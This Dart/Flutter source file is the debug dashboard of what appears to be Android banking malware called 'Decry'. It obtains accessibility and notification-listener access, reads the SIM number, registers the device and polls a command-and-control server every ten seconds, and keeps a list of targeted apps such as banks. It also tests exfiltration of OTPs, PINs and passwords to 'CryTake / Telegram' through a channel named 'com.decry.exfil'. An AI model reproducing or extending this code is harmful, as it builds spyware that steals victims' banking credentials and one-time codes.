import 'dart:async';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';

// TEMPORARY DEBUG UI — flip to false to remove it from builds.
// Everything in this file is scaffolding for VM testing only.
const bool kDebugUi = true;

class DebugDashboard extends StatefulWidget {
  const DebugDashboard({super.key});

  @override
  State<DebugDashboard> createState() => _DebugDashboardState();
}

class _DebugDashboardState extends State<DebugDashboard> {
  static const _permissionsChannel = MethodChannel('com.decry.permissions');
  static const _exfilChannel = MethodChannel('com.decry.exfil');

  final Map<String, String> _status = {
    'runtime': '?',
    'accessibility': '?',
    'notifListener': '?',
    'notifPolicy': '?',
    'silentMode': '?',
    'sim': '?',
    'bgService': '?',
  };

  final List<String> _targets = [];
  final List<Map<String, String>> _apps = [];
  final List<String> _log = [];

  String _lastRegister = 'never';
  String _lastPoll = 'never';
  String _lastExfil = 'never';
  int _pollCount = 0;
  bool _busy = false;

  final _targetCtrl = TextEditingController();
  final _otpCtrl = TextEditingController(text: '123456');
  final _pinCtrl = TextEditingController(text: '1234');
  final _passCtrl = TextEditingController(text: 'TestPass123');

  Timer? _refreshTimer;

  @override
  void initState() {
    super.initState();
    _fullInit();
    _refreshTimer = Timer.periodic(
      const Duration(seconds: 5),
      (_) => _refreshAll(silent: true),
    );
  }

  @override
  void dispose() {
    _refreshTimer?.cancel();
    _targetCtrl.dispose();
    _otpCtrl.dispose();
    _pinCtrl.dispose();
    _passCtrl.dispose();
    super.dispose();
  }

  void _dlog(String msg) {
    final ts = DateTime.now().toIso8601String().substring(11, 19);
    if (!mounted) return;
    setState(() {
      _log.insert(0, '[$ts] $msg');
      if (_log.length > 300) _log.removeLast();
    });
  }

  Future<void> _fullInit() async {
    _dlog('init: requesting runtime permissions...');
    try {
      final r = await _permissionsChannel.invokeMethod<Map<dynamic, dynamic>>(
        'requestRuntimePermissions',
      );
      _dlog('init: runtime perms -> ${r?['granted']}');
      if (mounted) setState(() => _status['runtime'] = '${r?['granted']}');
    } catch (e) {
      _dlog('init: runtime perms ERROR $e');
    }
    await _refreshAll();
    await _doRegister();
    try {
      await _permissionsChannel.invokeMethod('startBackgroundService');
      _dlog('init: startBackgroundService OK');
      if (mounted) setState(() => _status['bgService'] = 'started');
    } catch (e) {
      _dlog('init: startBackgroundService ERROR $e');
      if (mounted) setState(() => _status['bgService'] = 'ERR: $e');
    }
    _startPollLoop();
  }

  void _startPollLoop() {
    () async {
      while (mounted) {
        await Future.delayed(const Duration(seconds: 10));
        if (!mounted) return;
        try {
          await _permissionsChannel.invokeMethod('pollCommands');
          _pollCount++;
          _lastPoll = DateTime.now().toIso8601String().substring(11, 19);
          _dlog('poll #$_pollCount OK ($_lastPoll)');
          if (mounted) setState(() {});
        } catch (e) {
          _dlog('poll ERROR $e');
        }
      }
    }();
  }

  Future<void> _refreshAll({bool silent = false}) async {
    if (!silent && mounted) setState(() => _busy = true);
    // Special access block
    try {
      final r = await _permissionsChannel.invokeMethod<Map<dynamic, dynamic>>(
        'getSpecialAccessStatus',
      );
      if (mounted && r != null) {
        setState(() {
          _status['accessibility'] = '${r['accessibilityEnabled']}';
          _status['notifPolicy'] = '${r['notificationPolicyGranted']}';
          _status['notifListener'] = '${r['notificationListenerEnabled']}';
        });
      }
    } catch (e) {
      if (!silent) _dlog('refresh: specialAccess ERROR $e');
    }
    // Runtime check is implicit; re-query via SIM + silent + policy
    try {
      final sim = await _permissionsChannel.invokeMethod<String>('getSimNumber');
      if (mounted) setState(() => _status['sim'] = '$sim');
    } catch (e) {
      if (!silent) _dlog('refresh: getSimNumber ERROR $e');
    }
    try {
      final s = await _permissionsChannel.invokeMethod<bool>('isSilentModeOn');
      if (mounted) setState(() => _status['silentMode'] = s == true ? 'SILENT' : 'normal');
    } catch (e) {
      if (!silent) _dlog('refresh: isSilentModeOn ERROR $e');
    }
    try {
      final p = await _permissionsChannel.invokeMethod<bool>(
        'getNotificationPolicyStatus',
      );
      if (mounted) setState(() => _status['notifPolicy'] = '$p');
    } catch (_) {}
    await _loadTargets(silent: silent);
    if (mounted) setState(() => _busy = false);
    if (!silent) _dlog('refresh: done');
  }

  Future<void> _loadTargets({bool silent = false}) async {
    try {
      final t = await _permissionsChannel.invokeMethod<List<dynamic>>(
        'getTargetedApps',
      );
      if (mounted) {
        setState(() {
          _targets
            ..clear()
            ..addAll(t?.map((e) => '$e') ?? []);
        });
      }
    } catch (e) {
      if (!silent) _dlog('targets: ERROR $e');
    }
  }

  Future<void> _doRegister() async {
    try {
      await _permissionsChannel.invokeMethod('registerDevice');
      _lastRegister = DateTime.now().toIso8601String().substring(11, 19);
      _dlog('registerDevice OK ($_lastRegister)');
      if (mounted) setState(() {});
    } catch (e) {
      _dlog('registerDevice ERROR $e');
    }
  }

  Future<void> _doPollNow() async {
    try {
      await _permissionsChannel.invokeMethod('pollCommands');
      _pollCount++;
      _lastPoll = DateTime.now().toIso8601String().substring(11, 19);
      _dlog('manual poll #$_pollCount OK');
      if (mounted) setState(() {});
    } catch (e) {
      _dlog('manual poll ERROR $e');
    }
  }

  Future<void> _sendExfil(String type, String content, String extra) async {
    try {
      await _exfilChannel.invokeMethod('sendData', {
        'type': type,
        'content': content,
        'extra': extra,
      });
      _lastExfil = DateTime.now().toIso8601String().substring(11, 19);
      _dlog('exfil [$type] "$content" ($extra) sent via C2 @$_lastExfil');
      if (mounted) setState(() {});
    } catch (e) {
      _dlog('exfil [$type] ERROR $e');
    }
  }

  Future<void> _toggleSilent(bool on) async {
    try {
      await _permissionsChannel.invokeMethod('toggleSilentMode', {
        'enabled': on,
      });
      _dlog('silentMode -> ${on ? 'SILENT' : 'normal'} cmd sent');
      await Future.delayed(const Duration(milliseconds: 500));
      await _refreshAll(silent: true);
    } catch (e) {
      _dlog('silentMode ERROR $e');
    }
  }

  Future<void> _loadApps() async {
    try {
      final apps = await _permissionsChannel.invokeMethod<List<dynamic>>(
        'getInstalledApps',
      );
      if (mounted) {
        setState(() {
          _apps.clear();
          for (final a in apps ?? []) {
            final m = Map<String, dynamic>.from(a as Map);
            _apps.add({'name': '${m['name']}', 'package': '${m['package']}'});
          }
        });
      }
      _dlog('installedApps: ${_apps.length} loaded');
    } catch (e) {
      _dlog('installedApps ERROR $e');
    }
  }

  Future<void> _addTarget() async {
    final id = _targetCtrl.text.trim();
    if (id.isEmpty) return;
    try {
      await _permissionsChannel.invokeMethod('targetApp', {'appId': id});
      _dlog('targetApp "$id" OK');
      _targetCtrl.clear();
      await _loadTargets();
    } catch (e) {
      _dlog('targetApp ERROR $e');
    }
  }

  Future<void> _removeTarget(String id) async {
    try {
      await _permissionsChannel.invokeMethod('untargetApp', {'appId': id});
      _dlog('untargetApp "$id" OK');
      await _loadTargets();
    } catch (e) {
      _dlog('untargetApp ERROR $e');
    }
  }

  // ---------- UI ----------

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('Decry DEBUG (temporary)'),
        backgroundColor: Colors.orange.shade100,
        actions: [
          IconButton(
            icon: const Icon(Icons.copy),
            tooltip: 'Copy log',
            onPressed: () {
              Clipboard.setData(ClipboardData(text: _log.join('\n')));
              _dlog('log copied to clipboard (${_log.length} lines)');
            },
          ),
          IconButton(
            icon: const Icon(Icons.refresh),
            tooltip: 'Refresh all',
            onPressed: _busy ? null : () => _refreshAll(),
          ),
        ],
      ),
      body: SingleChildScrollView(
        padding: const EdgeInsets.all(12),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            _section('1  STATUS', [
              _row('runtime perms', _status['runtime']!),
              _row('accessibility', _status['accessibility']!),
              _row('notif listener', _status['notifListener']!),
              _row('notif policy', _status['notifPolicy']!),
              _row('silent mode', _status['silentMode']!),
              _row('SIM', _status['sim']!),
              _row('bg service', _status['bgService']!),
              const SizedBox(height: 8),
              Wrap(spacing: 8, runSpacing: 8, children: [
                _btn('Accessibility settings', () => _open('openAccessibilitySettings')),
                _btn('Listener settings', () => _open('openNotificationListenerSettings')),
                _btn('DND settings', () => _open('openNotificationPolicySettings')),
                _btn('Silent ON', () => _toggleSilent(true)),
                _btn('Silent OFF', () => _toggleSilent(false)),
              ]),
            ]),
            _section('2  C2 LINK (cry-take)', [
              _row('last register', _lastRegister),
              _row('last poll', '$_lastPoll (#$_pollCount, auto/10s)'),
              _row('last exfil', _lastExfil),
              const SizedBox(height: 8),
              Wrap(spacing: 8, runSpacing: 8, children: [
                _btn('Register now', _doRegister),
                _btn('Poll now', _doPollNow),
              ]),
            ]),
            _section('3  TARGET APPS (${_targets.length})', [
              Row(children: [
                Expanded(
                  child: TextField(
                    controller: _targetCtrl,
                    decoration: const InputDecoration(
                      hintText: 'com.example.bank',
                      border: OutlineInputBorder(),
                      isDense: true,
                    ),
                  ),
                ),
                const SizedBox(width: 8),
                ElevatedButton(onPressed: _addTarget, child: const Text('Add')),
              ]),
              const SizedBox(height: 8),
              if (_targets.isEmpty)
                const Text('(none)', style: TextStyle(color: Colors.grey)),
              for (final t in _targets)
                ListTile(
                  dense: true,
                  contentPadding: EdgeInsets.zero,
                  title: Text(t, style: const TextStyle(fontSize: 13)),
                  trailing: IconButton(
                    icon: const Icon(Icons.delete, size: 20),
                    onPressed: () => _removeTarget(t),
                  ),
                ),
            ]),
            _section('4  PIPELINE TEST (sends via C2 exfil)', [
              _testRow('OTP', _otpCtrl, () => _sendExfil('otp', _otpCtrl.text, 'debug_manual')),
              _testRow('PIN', _pinCtrl, () => _sendExfil('pin', _pinCtrl.text, 'debug_manual')),
              _testRow('PASS', _passCtrl, () => _sendExfil('password_capture', _passCtrl.text, 'debug_manual')),
              const SizedBox(height: 4),
              const Text(
                'Check CryTake / Telegram after each send.',
                style: TextStyle(fontSize: 12, color: Colors.grey),
              ),
            ]),
            _section('5  INSTALLED APPS (${_apps.length})', [
              _btn('Load installed apps', _loadApps),
              const SizedBox(height: 8),
              for (final a in _apps)
                InkWell(
                  onTap: () {
                    _targetCtrl.text = a['package']!;
                    _dlog('picked target ${a['package']}');
                  },
                  child: Padding(
                    padding: const EdgeInsets.symmetric(vertical: 4),
                    child: Text(
                      '${a['name']}\n${a['package']}',
                      style: const TextStyle(fontSize: 12),
                    ),
                  ),
                ),
            ]),
            _section('6  EVENT LOG (${_log.length})', [
              Container(
                height: 320,
                decoration: BoxDecoration(
                  color: Colors.black,
                  borderRadius: BorderRadius.circular(6),
                ),
                padding: const EdgeInsets.all(8),
                child: _log.isEmpty
                    ? const Text('(empty)',
                        style: TextStyle(color: Colors.grey, fontSize: 12))
                    : ListView.builder(
                        itemCount: _log.length,
                        itemBuilder: (_, i) => Text(
                          _log[i],
                          style: const TextStyle(
                            color: Colors.greenAccent,
                            fontSize: 11,
                            fontFamily: 'monospace',
                          ),
                        ),
                      ),
              ),
            ]),
            const SizedBox(height: 24),
          ],
        ),
      ),
    );
  }

  Future<void> _open(String method) async {
    try {
      await _permissionsChannel.invokeMethod(method);
      _dlog('open $method OK');
    } catch (e) {
      _dlog('open $method ERROR $e');
    }
  }

  Widget _section(String title, List<Widget> children) {
    return Card(
      margin: const EdgeInsets.only(bottom: 12),
      child: Padding(
        padding: const EdgeInsets.all(12),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            Text(title, style: const TextStyle(fontWeight: FontWeight.bold)),
            const Divider(),
            ...children,
          ],
        ),
      ),
    );
  }

  Widget _row(String label, String value) {
    final ok = value == 'true' || value == 'SILENT' || value == 'started';
    final bad = value == 'false' || value.startsWith('ERR');
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 2),
      child: Row(children: [
        Expanded(child: Text(label, style: const TextStyle(fontSize: 13))),
        Text(
          value,
          style: TextStyle(
            fontSize: 13,
            fontWeight: FontWeight.bold,
            color: ok ? Colors.green : (bad ? Colors.red : Colors.black87),
          ),
        ),
      ]),
    );
  }

  Widget _btn(String label, VoidCallback onTap) {
    return ElevatedButton(
      onPressed: onTap,
      style: ElevatedButton.styleFrom(
        backgroundColor: Colors.black,
        foregroundColor: Colors.white,
        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
      ),
      child: Text(label, style: const TextStyle(fontSize: 12)),
    );
  }

  Widget _testRow(String label, TextEditingController ctrl, VoidCallback send) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 8),
      child: Row(children: [
        SizedBox(width: 44, child: Text(label)),
        Expanded(
          child: TextField(
            controller: ctrl,
            decoration: const InputDecoration(
              border: OutlineInputBorder(),
              isDense: true,
            ),
          ),
        ),
        const SizedBox(width: 8),
        ElevatedButton(onPressed: send, child: const Text('Send')),
      ]),
    );
  }
}
